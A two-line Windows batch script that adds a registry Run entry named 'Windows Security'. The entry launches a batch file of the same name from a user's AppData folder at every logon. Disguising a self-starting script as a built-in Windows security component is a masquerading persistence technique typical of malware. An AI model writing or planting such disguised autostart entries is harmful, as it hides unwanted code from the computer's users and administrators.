@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security" /t REG_SZ /d "\"C:\Users\jelle\AppData\Roaming\Windows Security\WindowsSecurity.bat\"" /f
